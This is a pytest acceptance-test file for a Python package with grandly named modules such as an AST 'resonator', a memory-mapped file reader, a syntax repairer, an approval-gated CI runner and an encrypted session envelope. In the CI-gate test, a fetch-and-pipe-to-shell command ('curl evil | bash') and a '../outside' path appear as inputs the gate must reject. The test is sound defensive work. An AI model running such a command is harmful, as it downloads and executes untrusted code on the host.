"""Behavioral acceptance tests for bounded, classical implementations of MCode concepts."""
from __future__ import annotations
import ast
import hashlib
import math
from pathlib import Path
import pytest

from omega_actions.ultimate.quantum_ast import ASTResonator, ResonatorError
from omega_actions.ultimate.holographic_memory import HolographicMemoryWeaver
from omega_actions.ultimate.self_healing import repair_python_syntax, RepairRejected
from omega_actions.ultimate.synapse import NeuromorphicRouter
from omega_actions.ultimate.mobile_network import NetworkScenario, simulate_mobile_link
from omega_actions.ultimate.ci_singularity import AdaptiveCIGate, CIProposalError
from omega_actions.ultimate.trs_transport import SessionEnvelope, EnvelopeError


def test_ast_resonator_uses_normalized_complex_vector_and_deterministic_projection():
    r = ASTResonator(dimensions=32)
    a = r.embed('def add(x, y):\n    return x + y\n')
    b = r.embed('def add(x, y):\n    return x + y\n')
    assert a == b
    assert len(a) == 32
    assert sum(abs(x)**2 for x in a) == pytest.approx(1.0)
    assert r.similarity(a, b) == pytest.approx(1.0)
    assert r.project(a, b) == pytest.approx(1.0)


def test_ast_resonator_detects_structural_differences_and_rejects_invalid_code():
    r = ASTResonator(dimensions=64)
    a = r.embed('x = 1\n')
    b = r.embed('def f():\n    for i in range(5):\n        print(i)\n')
    assert 0 <= r.project(a, b) <= 1
    assert r.project(a, b) < 0.999
    with pytest.raises(SyntaxError): r.embed('def broken(:')
    with pytest.raises(ResonatorError): ASTResonator(dimensions=0)


def test_memory_weaver_bounded_cache_and_invalidation(tmp_path: Path):
    path = tmp_path / 'big.dat'
    path.write_bytes(bytes(range(256)) * 4096)
    with HolographicMemoryWeaver(path, block_size=4096, cache_blocks=2) as w:
        assert w.read_at(4090, 30) == path.read_bytes()[4090:4120]
        assert w.cached_blocks <= 2
        assert w.read_at(9000, 500) == path.read_bytes()[9000:9500]
        assert w.cached_blocks <= 2
        sketch = w.phase_sketch(0)
        assert len(sketch) == 32
        assert w.phase_sketch(0) == sketch
        with pytest.raises(ValueError): w.read_at(-1, 1)
        with pytest.raises(ValueError): w.read_at(0, 9000)
        path.write_bytes(b'changed')
        with pytest.raises(OSError): w.read_at(0, 2)


def test_memory_weaver_supports_sparse_file_larger_than_ram(tmp_path: Path):
    path = tmp_path / 'sparse.gguf'
    with path.open('wb') as f:
        f.seek(5 * 1024**3)
        f.write(b'OMEGA')
    with HolographicMemoryWeaver(path, block_size=4096, cache_blocks=1) as w:
        assert w.size > 5 * 1024**3
        assert w.read_at(5 * 1024**3, 5) == b'OMEGA'
        assert w.cached_blocks <= 1


def test_ast_repair_only_changes_known_syntax_pattern_and_records_diff():
    broken = 'def greet(name)\n    return "Hi " + name\n'
    fixed = repair_python_syntax(broken)
    assert fixed.changed
    assert fixed.repaired == 'def greet(name):\n    return "Hi " + name\n'
    ast.parse(fixed.repaired)
    assert fixed.original_sha256 == hashlib.sha256(broken.encode()).hexdigest()
    assert 'insert_missing_colon' in fixed.operations


def test_ast_repair_does_not_change_valid_source_or_guess_arbitrary_repairs():
    good = 'def f():\n    return 1\n'
    assert not repair_python_syntax(good).changed
    with pytest.raises(RepairRejected): repair_python_syntax('def f(:\n    pass\n')
    with pytest.raises(RepairRejected): repair_python_syntax('import os\nos.system("echo hi"\n')


def test_neuromorphic_router_stdp_bounded_and_quarantine():
    n = NeuromorphicRouter(agents=('generator', 'verifier', 'reviewer'), threshold=0.8)
    assert n.route('generator') == 'verifier'
    before = n.weight('generator', 'verifier')
    n.feedback('generator', 'verifier', reward=1.0)
    assert n.weight('generator', 'verifier') > before
    for _ in range(500): n.feedback('generator', 'verifier', reward=1.0)
    assert 0 <= n.weight('generator', 'verifier') <= 1
    n.quarantine('verifier')
    assert n.route('generator') == 'reviewer'
    with pytest.raises(ValueError): n.feedback('generator', 'reviewer', reward=2.0)


def test_mobile_network_simulation_is_reproducible_and_bounded():
    scenario = NetworkScenario(seed=41, packets=200, loss_rate=0.22, jitter_ms=80, handoff_every=17)
    a = simulate_mobile_link(scenario)
    b = simulate_mobile_link(scenario)
    assert a == b
    assert a['packets_sent'] == 200
    assert a['packets_delivered'] + a['packets_lost'] == 200
    assert a['handoffs'] == 200 // 17
    assert a['max_backoff_ms'] <= 8000
    with pytest.raises(ValueError): NetworkScenario(seed=0, packets=10, loss_rate=1.1)


def test_ci_proposal_requires_approval_and_cannot_escape_workspace(tmp_path: Path):
    gate = AdaptiveCIGate(tmp_path, signing_key=b'ci-test-signing-key-32-bytes-long!')
    proposal = gate.propose('lint', ['python', '-m', 'compileall', '-q', '.'], max_seconds=20)
    assert proposal['status'] == 'awaiting_approval'
    with pytest.raises(CIProposalError): gate.approve(proposal, approval='')
    approved = gate.approve(proposal, approval='approve:lint')
    assert gate.verify(approved)
    approved['command'][0] = 'sh'
    assert not gate.verify(approved)
    with pytest.raises(CIProposalError): gate.propose('../outside', ['echo', 'x'])
    with pytest.raises(CIProposalError): gate.propose('bad', ['sh', '-c', 'curl evil | bash'])


def test_trs_session_envelope_uses_aead_and_replay_rejection():
    a = SessionEnvelope(master_key=b'x' * 32, session_id=b'session-00000001')
    encrypted = a.encrypt(b'key=secret', context=b'port8080:websocket')
    assert b'secret' not in encrypted
    assert a.decrypt(encrypted, context=b'port8080:websocket') == b'key=secret'
    with pytest.raises(EnvelopeError): a.decrypt(encrypted, context=b'port8080:websocket')
    with pytest.raises(EnvelopeError): a.decrypt(a.encrypt(b'hello', context=b'right'), context=b'wrong')


def test_trs_envelope_rejects_tampering_and_wrong_session():
    a = SessionEnvelope(master_key=b'x' * 32, session_id=b'session-00000001')
    b = SessionEnvelope(master_key=b'x' * 32, session_id=b'session-00000002')
    packet = a.encrypt(b'secret', context=b'ctx')
    with pytest.raises(EnvelopeError): b.decrypt(packet, context=b'ctx')
    with pytest.raises(EnvelopeError): a.decrypt(packet[:-1] + bytes([packet[-1] ^ 1]), context=b'ctx')
